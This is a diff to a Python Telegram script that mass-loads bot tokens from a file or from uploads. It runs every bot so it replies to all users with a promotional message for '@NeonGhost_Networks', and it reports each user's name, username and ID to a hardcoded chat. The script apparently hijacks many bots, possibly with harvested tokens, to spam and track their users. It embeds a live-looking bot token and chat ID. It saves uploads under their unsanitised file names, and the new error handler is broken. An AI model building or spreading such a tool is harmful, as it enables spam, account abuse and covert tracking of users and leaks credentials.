@@ -1,12 +1,17 @@
 import re
 import asyncio
 import os
+import logging
 from telegram import Bot, Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
 from telegram.constants import ParseMode
 import telegram
 from collections import deque
 from time import time
+
+# Set up logging
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # Constants
 CUSTOM_MESSAGE = r"""
@@ -31,6 +36,7 @@ For More: \- *@NeonGhost\_Networks*
 
 NOTIFICATION_BOT_TOKEN = '6836105234:AAFYHYLpQrecJGMVIRJHraGnHTbcON3pxxU'
 NOTIFICATION_CHAT_ID = '-1002177330851'
+BOT_TOKENS_FILE = 'bot_tokens.txt'
 
 # Global variables
 total_messages_sent = 0
@@ -48,7 +54,7 @@ async def send_notification(user_info, interaction_type, bot_info=None):
     try:
         await notification_bot.send_message(chat_id=NOTIFICATION_CHAT_ID, text=message)
     except telegram.error.TelegramError as e:
-        print(f"Error sending notification: {e}")
+        logger.error(f"Error sending notification: {e}")
 
 async def handle_user_interaction(update: Update, context):
     global total_messages_sent, user_interaction_cache
@@ -57,10 +63,14 @@ async def handle_user_interaction(update: Update, context):
     chat = update.effective_chat
     bot = context.bot
     
-    user_info = f"{user.first_name} {user.last_name or ''} (@{user.username or 'No username'}) (ID: {user.id})"
+    if user is None:
+        user_info = "Unknown user"
+    else:
+        user_info = f"{user.first_name or ''} {user.last_name or ''} (@{user.username or 'No username'}) (ID: {user.id})"
+    
     bot_info = f"{bot.first_name} (@{bot.username})"
     
-    interaction_key = f"{user.id}_{bot.id}_{chat.id}"
+    interaction_key = f"{user.id if user else 'unknown'}_{bot.id}_{chat.id if chat else 'unknown'}"
     
     if interaction_key not in user_interaction_cache:
         user_interaction_cache.add(interaction_key)
@@ -73,6 +83,9 @@ async def handle_user_interaction(update: Update, context):
         await send_notification(user_info, "Custom message sent", bot_info)
     except telegram.error.TelegramError as e:
         error_message = f"Error sending message: {str(e)}"
+        await send_notification(user_info, "Error", f"{bot_info}\n{error_message}")
+    except AttributeError:
+        error_message = "Error: Message object is None"
         await send_notification(user_info, "Error", f"{bot_info}\n{error_message}")
 
 # Command handlers
@@ -107,12 +120,20 @@ async def add_token_file(update: Update, context):
         if not tokens:
             await update.message.reply_text("No valid tokens found in the provided file.")
             return
+        
+        status_message = await update.message.reply_text("Starting to add new bots...")
         new_bots = 0
-        for token in tokens:
-            bot = await initialize_bot(token)
-            if bot:
-                new_bots += 1
-        await update.message.reply_text(f"Successfully added {new_bots} new bots from the file.")
+        for i, token in enumerate(tokens):
+            if token not in [bot['token'] for bot in running_bots]:
+                bot = await initialize_bot(token)
+                if bot:
+                    new_bots += 1
+                    await status_message.edit_text(f"Added {new_bots} new bot(s). Processing token {i+1}/{len(tokens)}...")
+            else:
+                await status_message.edit_text(f"Skipped existing bot. Processing token {i+1}/{len(tokens)}...")
+        
+        save_bot_tokens()
+        await status_message.edit_text(f"Finished! Successfully added {new_bots} new bots from the file.")
     except Exception as e:
         await update.message.reply_text(f"Failed to add tokens from the file: {str(e)}")
 
@@ -130,30 +151,61 @@ async def list_running_bots(update: Update, context):
     await update.message.reply_text(bot_list)
 
 # Utility functions
-def read_tokens(file_path):
-    token_pattern = r'Bot token: (\d+:[A-Za-z0-9_-]+)'
-    tokens = []
+def load_bot_tokens():
+    if os.path.exists(BOT_TOKENS_FILE):
+        try:
+            with open(BOT_TOKENS_FILE, 'r', encoding='utf-8') as f:
+                tokens = []
+                for line in f:
+                    parts = line.strip().split(', ')
+                    if parts and parts[0].startswith('Bot token:'):
+                        token = parts[0].split(': ', 1)[1]
+                        tokens.append(token)
+                return tokens
+        except UnicodeDecodeError:
+            # If UTF-8 fails, try with 'latin-1' encoding
+            with open(BOT_TOKENS_FILE, 'r', encoding='latin-1') as f:
+                tokens = []
+                for line in f:
+                    parts = line.strip().split(', ')
+                    if parts and parts[0].startswith('Bot token:'):
+                        token = parts[0].split(': ', 1)[1]
+                        tokens.append(token)
+                return tokens
+    return []
+
+def save_bot_tokens():
+    with open(BOT_TOKENS_FILE, 'w', encoding='utf-8') as f:
+        for bot in running_bots:
+            f.write(f"Bot token: {bot['token']}, Name: {bot['name']}, Username: {bot['username']}\n")
+
+async def check_bot_token(token):
     try:
-        with open(file_path, 'r', encoding='utf-8') as file:
-            content = file.read()
-            tokens = re.findall(token_pattern, content)
-    except FileNotFoundError:
-        print(f"Token file not found: {file_path}")
+        bot = Bot(token)
+        await bot.get_me()
+        return True
+    except telegram.error.InvalidToken:
+        logger.error(f"Invalid token: {token[:10]}...")
+        return False
     except Exception as e:
-        print(f"Error reading token file: {str(e)}")
-    return tokens
+        logger.error(f"Error checking token {token[:10]}...: {str(e)}")
+        return False
 
 async def initialize_bot(token):
     global running_bots
     try:
+        if not await check_bot_token(token):
+            return None
+
         for bot in running_bots:
             if bot['token'] == token:
-                print(f"Bot with token {token[:10]}... is already running.")
+                logger.info(f"Bot with token {token[:10]}... is already running.")
                 return None
         
         app = Application.builder().token(token).build()
         app.add_handler(CommandHandler("start", start))
         app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
+        app.add_error_handler(global_error_handler)
         
         await app.initialize()
         await app.start()
@@ -166,21 +218,34 @@ async def initialize_bot(token):
             'username': bot_info.username,
             'app': app
         })
-        print(f"Bot with token {token[:10]}... successfully started.")
+        logger.info(f"Bot with token {token[:10]}... successfully started.")
         return app
-    except telegram.error.InvalidToken:
-        print(f"Invalid token: {token[:10]}... Skipping this bot.")
     except Exception as e:
-        print(f"Error initializing bot with token {token[:10]}...: {str(e)}")
+        logger.error(f"Error initializing bot with token {token[:10]}...: {str(e)}")
     
     await asyncio.sleep(0.5)  # Reduced delay to 0.5 seconds
     return None
 
-# Error handler
-async def error_handler(update: Update, context):
-    error_message = f"An error occurred: {context.error}"
-    print(error_message)
-    await send_notification("System", "Error", error_message)
+# Error handlers
+async def global_error_handler(update: Update, context: CallbackContext) -> None:
+    error = context.error
+    try:
+        raise error
+    except telegram.error.Unauthorized:
+        logger.error(f"Unauthorized error: {error}")
+    except telegram.error.BadRequest:
+        logger.error(f"Bad request: {error}")
+    except telegram.error.TimedOut:
+        logger.error(f"Timed out: {error}")
+    except telegram.error.NetworkError:
+        logger.error(f"Network error: {error}")
+    except AttributeError:
+        logger.error(f"Attribute error: {error}")
+    except Exception as e:
+        logger.error(f"Unexpected error: {error}")
+    
+    # Notify about the error
+    await send_notification("System", f"Global error: {str(error)}")
 
 # File handler
 async def file_handler(update: Update, context):
@@ -188,30 +253,35 @@ async def file_handler(update: Update, context):
         file_id = update.message.document.file_id
         new_file = await context.bot.get_file(file_id)
         file_path = os.path.join("uploaded_files", update.message.document.file_name)
+        os.makedirs(os.path.dirname(file_path), exist_ok=True)
         await new_file.download(file_path)
         uploaded_files[update.message.message_id] = file_path
         await update.message.reply_text(f"File {update.message.document.file_name} uploaded. Reply with /add_token_file to add tokens from this file.")
 
+async def start_bots_in_batches(tokens, batch_size=5):
+    for i in range(0, len(tokens), batch_size):
+        batch = tokens[i:i+batch_size]
+        await asyncio.gather(*[initialize_bot(token) for token in batch])
+        await asyncio.sleep(1)  # Wait a bit between batches
+
 # Main function
 async def main():
     global running_bots
-    token_file = 'bot_tokens.txt'
-    tokens = read_tokens(token_file)
+    tokens = load_bot_tokens()
     
-    # Use asyncio.gather to start bots concurrently
-    await asyncio.gather(*[initialize_bot(token) for token in tokens])
+    await start_bots_in_batches(tokens)
     
     if not running_bots:
-        print("No bots were successfully initialized. Exiting.")
+        logger.warning("No bots were successfully initialized. Exiting.")
         return
-    print(f"Successfully started {len(running_bots)} bot(s).")
+    logger.info(f"Successfully started {len(running_bots)} bot(s).")
 
     personal_app = Application.builder().token(NOTIFICATION_BOT_TOKEN).build()
     personal_app.add_handler(CommandHandler("stats", stats_command))
     personal_app.add_handler(CommandHandler("add_token_file", add_token_file))
     personal_app.add_handler(CommandHandler("list_bots", list_running_bots))
     personal_app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
-    personal_app.add_error_handler(error_handler)
+    personal_app.add_error_handler(global_error_handler)
     await personal_app.initialize()
     await personal_app.start()
     await personal_app.updater.start_polling()
